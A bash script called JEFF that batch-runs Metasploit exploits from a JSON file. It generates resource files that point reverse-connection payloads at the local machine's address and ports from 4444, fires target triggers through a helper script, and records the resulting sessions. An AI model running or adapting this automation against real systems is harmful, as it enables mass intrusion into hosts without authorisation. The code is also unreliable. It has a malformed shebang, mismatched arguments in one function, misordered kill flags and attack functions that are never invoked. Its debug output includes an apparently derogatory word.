#/bin/bash

[[ `id -u` -eq 0 ]] || { echo -e "\e[31mMust be root to run script"; exit 1;} 

set -e 
set -u
set -o pipefail

export PATH="$PATH:."

function cleanup()
{
	echo 'Killing'	
	rm *.rc	
	for i in "${array[@]}"
	do
		pkill -P -9 "$i"
	done
}

trap cleanup 2

function HELP()
{
	echo
	echo "Description: use script for metasploit exploits automation"
       	echo "Script uses .json files with required options"
	echo
	echo "Syntax: ./jeff.sh <.json file>" echo 
	echo "options:"
	echo "-h	help"
	echo "-b 	banner"
	echo "-rm	remove old documentation"
}

function BANNER()
{
	echo
	figlet JEFF 
	echo "     version 0.8.20"
	echo	
}

function REMOVE()
{
	echo "duhai"
	count=`ls -1 $HOME + JEFF/*.txt 2>/dev/null | wc -l`
	echo "$count"
	if [ $count != 0 ]; then 
		rm /home/root/JEFF/*.txt
	else 
		echo "There is no files to remove"
	fi
}

function simple()
{
    mkdir -p /home/root/JEFF
    filelength=$(jq '. | length' $1)
    count=0 
    declare -a array
    LHOST=($(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'))
    for((i = 0;i<filelength;i++))
    do		
        resource=$count.rc
        touch $resource
        atk=$(jq -r ".[$i] | .ATK" $1)
        keys=($(jq -r ".[$i] | keys_unsorted[]  " $1))
        echo "use $(jq -r ".[$i] | .ATK" $1)" >> $resource
        echo "set LHOST $LHOST">>$resource
        echo "set SRVHOST $LHOST">>$resource
        LPORT=$(expr $i + 4444)
        echo "set LPORT $(expr $i + 4444)">>$resource
        for key in "${keys[@]}";
        do
            if [ "$key" != "ATK" ] && [ "$key" != "OPTION" ]
            then
                echo "set $key $(jq -r ".[$i] | .$key" $1)" >> $resource
            fi
            if [ "$key" == "OPTION" ]
            then 
                option=$(jq -r ".[$i] | .OPTION" $1)	
                case $option in
                    browser)echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                            echo "exploit -z">>$resource;
                        echo "python greeter_client.py -b">>$resource;
                        echo "sleep 60">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                    fileformat)echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                            echo "exploit -zj">>$resource;
                        echo "python greeter_client.py -f">>$resource;
                        echo "sleep 30">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                    sip) echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                        echo "python greeter_client.py -s">>$resource;
                        echo "sleep 60">>$resource;
                        echo "exploit -z">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                    imap) echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                        echo "python greeter_client.py -i">>$resource;
                        echo "sleep 10">>$resource;
                        echo "exploit -z">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                    psql) echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                        echo "exploit -zj">>$resource;
                        echo "sleep 60">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                esac
            fi
        done 
        if [ $(jq -r ".[$i] | .OPTION?" $1) == null ]
        then
            echo "spool /home/root/JEFF/msf$i.txt">>$resource
            echo "exploit -z" >> $resource
            echo "sessions">>$resource
            echo "spool off">>$resource;
            echo "exit -y">>$resource
        fi
        sudo msfconsole -q -r $resource &
        array+=($!)
        count=$[$count + 1]
    done 
    wait
    cc=`ls -1 *.rc 2>/dev/null | wc -l`
    if [ $cc != 0 ]
    then 
        rm *.rc
    fi    
}

complex()
{
    mkdir -p /home/root/JEFF
    filelength=$(jq '. | length' $3)
    count=0 
    declare -a array
    LHOST=($(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'))
    for((i = 0;i<filelength;i++))
    do		
        resource=$count.rc
        touch $resource
        atk=$(jq -r ".[$i] | .ATK" $3)
        keys=($(jq -r ".[$i] | keys_unsorted[]  " $3))
        echo "use $(jq -r ".[$i] | .ATK" $1)" >> $resource
        echo "set LHOST $LHOST">>$resource
        echo "set SRVHOST $LHOST">>$resource
        LPORT=$(expr $i + 4444)
        echo "set LPORT $(expr $i + 4444)">>$resource
        for key in "${keys[@]}";
        do
            if [ "$key" != "ATK" ] && [ "$key" != "OPTION" ]
            then
                echo "set $key $(jq -r ".[$i] | .$key" $3)" >> $resource
            fi
            if [ "$key" == "OPTION" ]
            then 
                option=$(jq -r ".[$i] | .OPTION" $3)	
                case $option in
                    browser)echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                            echo "exploit -z">>$resource;
                        echo "python greeter_client.py -b">>$resource;
                        echo "sleep 60">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                    fileformat)echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                            echo "exploit -zj">>$resource;
                        echo "python greeter_client.py -f">>$resource;
                        echo "sleep 30">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                    sip) echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                        echo "python greeter_client.py -s">>$resource;
                        echo "sleep 60">>$resource;
                        echo "exploit -z">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                    imap) echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                        echo "python greeter_client.py -i">>$resource;
                        echo "sleep 10">>$resource;
                        echo "exploit -z">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                    psql) echo "spool /home/root/JEFF/msf$i.txt">>$resource;
                        echo "exploit -zj">>$resource;
                        echo "sleep 60">>$resource;
                        echo "sessions">>$resource;
                        echo "spool off">>$resource;
                        echo "exit -y">>$resource;;
                esac
            fi
        done 
        if [ $(jq -r ".[$i] | .OPTION?" $1) == null ]
        then
            echo "spool /home/root/JEFF/msf$i.txt">>$resource
            echo "exploit -z" >> $resource
            echo "sessions">>$resource
            echo "spool off">>$resource;
            echo "exit -y">>$resource
        fi
        sudo msfconsole -q -r $resource &
        array+=($!)
        count=$[$count + 1]
    done 
    wait
    cc=`ls -1 *.rc 2>/dev/null | wc -l`
    if [ $cc != 0 ]
    then 
        rm *.rc
    fi    
}

while getopts 'bhr' OPTION; do
  case "$OPTION" in
    b)
      BANNER;
      exit 1;
      ;;

    h)
      HELP;
      exit 1;
      ;;

    r)
      echo "negriukai";
      REMOVE;
      exit 1;
      ;;
    ?)
      echo "ziauruuuu"
      exit 1
      ;;
  esac
done
shift "$(($OPTIND -1))"
